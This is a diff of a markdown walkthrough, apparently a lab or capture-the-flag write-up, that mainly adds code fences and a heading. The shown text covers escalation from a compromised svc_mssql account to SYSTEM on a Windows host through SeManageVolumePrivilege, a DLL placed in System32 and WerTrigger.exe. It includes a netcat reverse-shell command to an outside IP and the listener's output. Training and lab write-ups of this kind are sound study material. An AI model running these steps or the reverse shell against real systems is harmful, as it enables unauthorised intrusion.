@@ -579,8 +579,11 @@ whoami && hostname
 access\svc_mssql
 SERVER
 We have successfully compromised the svc_mssql account!
+```
 
-Escalation
+## Escalation
+```
+
 Enumeration privleges, we discover that SeManageVolumePrivilege is assigned to the svc_mssql account. We can take advantage of this privilege to get Administrator access to the target.
 
 C:\Users\svc_mssql\Desktop>whoami /priv
@@ -610,7 +613,9 @@ This exploit grants full permission on C:\ drive for all users on the machine.
 Let's grab the compiled executable from the releases page.
 
 We upload SeManageVolumeExploit.exe to the target and execute it. After execution, we discover that the Builtin Users group has full permissions on the Windows folder.
+```
 
+```
 C:\xampp\htdocs\uploads>whoami
 access\svc_mssql
 
@@ -632,6 +637,9 @@ To set it up we need to:
 Copy phoneinfo.dll to *C:\Windows\System32*
 Place Report.wer file and WerTrigger.exe in a same directory.
 Run WerTrigger.exe.
+```
+
+```
 C:\xampp\htdocs\uploads\enox>dir
 dir
  Volume in drive C has no label.
@@ -650,19 +658,25 @@ C:\xampp\htdocs\uploads\enox>WerTrigger.exe
 WerTrigger.exe
 c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe
 Note : WerTrigger.exe will not produce any output and will just wait for you to type the instructions you want to perform.
+```
 
+```
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [192.168.118.23] from (UNKNOWN) [192.168.120.107] 49998
 Microsoft Windows [Version 10.0.17763.2746]
 (c) 2018 Microsoft Corporation. All rights reserved.
+```
 
+```
 C:\Windows\system32>whoami && hostname 
 whoami && hostname 
 nt authority\system
 SERVER
+```
 
+```
 C:\Windows\system32>
 We now have system level access on the target machine!
 ```
